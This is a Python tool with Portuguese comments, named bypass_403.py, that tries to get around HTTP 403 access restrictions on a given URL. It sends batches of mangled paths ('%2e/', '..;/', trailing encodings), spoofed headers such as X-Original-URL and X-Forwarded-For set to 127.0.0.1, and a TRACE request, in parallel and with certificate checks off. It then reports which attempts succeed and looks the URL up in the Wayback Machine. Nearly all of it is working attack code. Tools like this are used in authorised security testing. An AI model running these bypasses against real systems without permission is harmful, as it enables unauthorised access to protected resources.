import requests
import sys
import json
import re
import concurrent.futures
from urllib.parse import urljoin, urlparse
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Configuração do User-Agent padrão do Chrome
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# Métodos de bypass
BYPASS_PATTERNS = [
    "{path}", "%2e/{path}", "{path}/.", "//{path}//", "./{path}/./", "{path}%20", "{path}%09", "{path}?", "{path}.html",
    "{path}/?anything", "{path}#", "{path}/*", "{path}.php", "{path}.json", "{path}..;/", "{path};/"
]

HEADERS_BYPASS = {
    "X-Original-URL": "{path}",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1:80",
    "X-rewrite-url": "{path}",
    "X-Host": "127.0.0.1",
    "X-Forwarded-Host": "127.0.0.1"
}


def request_url(base_url, path, headers=None, method="GET"):
    """Realiza uma requisição HTTP ignorando erros de SSL, com timeout."""
    url = urljoin(base_url, path)
    try:
        response = requests.request(method, url, headers=headers or HEADERS, verify=False, allow_redirects=True, timeout=5)
        return response.status_code, len(response.content)
    except requests.RequestException as e:
        return None, f"Erro: {str(e)}"


def extract_base_and_path(url):
    """Separa a URL base do caminho."""
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    path = parsed_url.path.lstrip('/')
    return base_url, path


def run_bypass(base_url, path):
    """Executa bypasses em paralelo para melhorar performance."""
    print("\n[+] Testando bypasses...")

    bypass_tests = []

    # Criar lista de testes para caminhos
    for pattern in BYPASS_PATTERNS:
        test_path = pattern.format(path=path)
        bypass_tests.append(("PATH", test_path))

    # Criar lista de testes para headers
    for header, value in HEADERS_BYPASS.items():
        headers = HEADERS.copy()
        headers[header] = value.format(path=path)
        bypass_tests.append(("HEADER", path, header, headers))

    # Adicionar teste de método TRACE
    bypass_tests.append(("METHOD", path, "TRACE"))

    # Criar um pool de threads para paralelizar requisições
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_test = {}

        # Enviar requests de PATH
        for bypass_type, test_path in [t for t in bypass_tests if t[0] == "PATH"]:
            future = executor.submit(request_url, base_url, test_path)
            future_to_test[future] = (bypass_type, test_path)

        # Enviar requests de HEADERS
        for bypass_type, path, header, headers in [t for t in bypass_tests if t[0] == "HEADER"]:
            future = executor.submit(request_url, base_url, path, headers)
            future_to_test[future] = (bypass_type, path, header)

        # Enviar requests de MÉTODO
        for bypass_type, path, method in [t for t in bypass_tests if t[0] == "METHOD"]:
            future = executor.submit(request_url, base_url, path, method=method)
            future_to_test[future] = (bypass_type, path, method)

        # Processar resultados
        for future in concurrent.futures.as_completed(future_to_test):
            bypass_type, *params = future_to_test[future]
            try:
                status_code, size = future.result()
                if status_code is not None:
                    if bypass_type == "PATH":
                        print_result(params[0], status_code, size,base_url)
                    elif bypass_type == "HEADER":
                        print_result(f"{params[0]} ({params[1]})", status_code, size,base_url)
                    elif bypass_type == "METHOD":
                        print_result(f"{params[0]} ({params[1]})", status_code, size,base_url)
            except Exception as exc:
                print(f"Erro em {params}: {exc}")

    # Wayback Machine
    check_wayback(base_url, path)


def print_result(test_path, status_code, size,base_url):
    """Exibe resultados formatados destacando os que são diferentes de 403."""
    if status_code == 403:
        print(f"\033[91m{base_url}/{test_path} --> {status_code}, {size} bytes\033[0m")  # Vermelho
    elif status_code == 200:
        print(f"\033[92m{base_url}/{test_path} --> {status_code}, {size} bytes\033[0m")  # Verde
    else:
        print(f"\033[93m{base_url}/{test_path} --> {status_code}, {size} bytes\033[0m")  # Amarelo


def check_wayback(base_url, path):
    """Consulta o Wayback Machine para ver se a URL já foi arquivada."""
    wayback_url = f"https://archive.org/wayback/available?url={base_url}/{path}"
    try:
        wayback_response = requests.get(wayback_url, timeout=5).json()
        snapshot = wayback_response.get("archived_snapshots", {}).get("closest", {})
        if snapshot:
            print("\n\033[94m[Wayback Machine] Arquivo encontrado:\033[0m")
            print(json.dumps(snapshot, indent=2))
        else:
            print("\n\033[94m[Wayback Machine] Nenhum arquivo encontrado.\033[0m")
    except Exception as e:
        print(f"Erro ao consultar Wayback Machine: {str(e)}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python bypass_403.py <URL_COMPLETA OU URL_BASE CAMINHO>")
        sys.exit(1)

    user_input = sys.argv[1]
    base_url, path = extract_base_and_path(user_input)
    run_bypass(base_url, path)
